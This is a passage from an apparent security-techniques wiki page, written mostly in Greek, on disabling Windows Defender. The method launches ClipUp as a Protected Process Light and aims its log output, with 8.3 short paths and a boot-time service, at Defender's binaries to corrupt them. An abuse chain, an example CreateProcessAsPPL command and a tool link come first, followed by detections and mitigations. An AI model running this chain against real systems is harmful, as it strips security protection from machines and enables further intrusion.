- Προβολή σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Προσδιορισμός σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Περάστε το ClipUp log-path argument για να αναγκάσετε τη δημιουργία αρχείου σε έναν προστατευμένο κατάλογο AV (π.χ., Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Εάν το target binary είναι κανονικά ανοιχτό/κλειδωμένο από το AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση πριν ξεκινήσει το AV εγκαθιστώντας μια auto-start service που τρέχει αξιόπιστα νωρίτερα. Επιβεβαιώστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL πραγματοποιείται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το αρχείο-στόχο και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε το περιεχόμενο που γράφει το ClipUp πέρα από τη θέση· η λειτουργία είναι περισσότερο κατάλληλη για αλλοίωση παρά για ακριβή εισαγωγή περιεχομένου.
- Απαιτεί local admin/SYSTEM για εγκατάσταση/εκκίνηση υπηρεσίας και παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τους κλειδωμένους αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα επιχειρήματα, ιδιαίτερα όταν έχει ως γονέα μη τυπικούς εκκινητές, γύρω από την εκκίνηση.
- Νέες υπηρεσίες διαμορφωμένες να auto-start ύποπτα binaries και που ξεκινούν σταθερά πριν το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσίας πριν από σφάλματα εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων σε Defender binaries/Platform directories· απροσδόκητες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- ETW/EDR τηλεμετρία: αναζητήστε διεργασίες δημιουργημένες με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδου PPL από μη-AV binaries.

Μέτρα μετριασμού
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να τρέξουν ως PPL και υπό ποιους γονείς· μπλοκάρετε την κλήση του ClipUp εκτός νόμιμων πλαισίων.
- Διαχείριση υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών με αυτόματη εκκίνηση και παρακολουθήστε χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι το Defender tamper protection και τα early-launch protections είναι ενεργοποιημένα· ερευνήστε σφάλματα εκκίνησης που υποδεικνύουν διαφθορά binaries.
- Σκεφτείτε να απενεργοποιήσετε τη δημιουργία 8.3 short-name σε volumes που φιλοξενούν security tooling αν είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
